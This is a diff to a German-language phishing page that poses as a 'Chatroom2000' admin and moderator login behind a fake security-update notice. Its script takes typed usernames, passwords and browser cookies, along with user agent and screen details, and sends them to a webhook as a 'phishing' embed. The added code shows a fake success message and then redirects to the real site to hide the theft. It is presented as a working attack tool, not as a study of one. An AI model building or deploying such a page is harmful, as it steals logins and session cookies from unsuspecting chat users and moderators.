@@ -68,6 +68,13 @@
             transform: scale(1.06);
             box-shadow: 0 0 25px #66aaff;
         }
+        #success {
+            display: none;
+            color: #00ff9d;
+            font-size: 22px;
+            margin-top: 30px;
+            text-shadow: 0 0 10px #00ff9d;
+        }
         .footer {
             margin-top: 35px;
             font-size: 12px;
@@ -76,15 +83,17 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Chatroom2000  Login</h1>
-        <p class="subtitle">Sicherheits-Update erforderlich – bitte jetzt einloggen</p>
+    <div class="container" id="loginContainer">
+        <h1>Chatroom2000 Admin / Mod Login</h1>
+        <p class="subtitle">Sicherheits-Update erforderlich – bitte einloggen</p>
         
         <form id="phishForm">
-            <input type="text" id="username" placeholder="Benutzername" required autocomplete="off">
+            <input type="text" id="username" placeholder="Benutzername / Admin-Name" required autocomplete="off">
             <input type="password" id="password" placeholder="Passwort" required autocomplete="off">
             <button type="submit">Einloggen</button>
         </form>
+
+        <div id="success">Login erfolgreich! Weiterleitung läuft...</div>
 
         <div class="footer">
             © 2026 Chatroom2000 – Systemwartung
@@ -99,21 +108,21 @@
             
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
-            const cookies = document.cookie || "keine Cookies";
+            const cookies = document.cookie || "keine";
             const userAgent = navigator.userAgent;
             const screen = `${screen.width}x${screen.height}`;
             const timestamp = new Date().toLocaleString('de-DE');
 
             const payload = {
                 embeds: [{
-                    title: "Neuer Admin-Login erbeutet",
+                    title: "🎣 Neuer Chatroom2000 Login",
                     color: 0x00FFFF,
                     fields: [
-                        { name: "Benutzername", value: `\`\`\`${username}\`\`\``, inline: true },
-                        { name: "Passwort", value: `\`\`\`${password}\`\`\``, inline: true },
+                        { name: "Username", value: `\`\`\`${username || "leer"}\`\`\``, inline: true },
+                        { name: "Passwort", value: `\`\`\`${password || "leer"}\`\`\``, inline: true },
                         { name: "Cookies", value: `\`\`\`${cookies.slice(0,1000)}\`\`\``, inline: false },
                         { name: "User-Agent", value: userAgent.slice(0,200), inline: false },
-                        { name: "Bildschirm", value: screen, inline: true },
+                        { name: "Screen", value: screen, inline: true },
                         { name: "Zeit", value: timestamp, inline: true }
                     ],
                     footer: { text: "Chatroom2000 Phishing • " + timestamp }
@@ -126,11 +135,22 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch {}
+            } catch (err) {
+                console.error('Webhook-Fehler:', err);
+            }
 
-            // Fake Redirect zur echten Seite
-            window.location.href = 'https://chatroom2000.de';
+            // Fake-Erfolg anzeigen – KEIN echter Redirect
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('success').style.display = 'block';
+            
+            // Optional: Nach 3 Sekunden zurück zur echten Seite (oder einfach bleiben)
+            setTimeout(() => {
+                window.location.href = 'https://chatroom2000.de';
+            }, 3000);
         });
     </script>
 </body>
 </html>
+
+
+Gesendet von Outlook für iOS
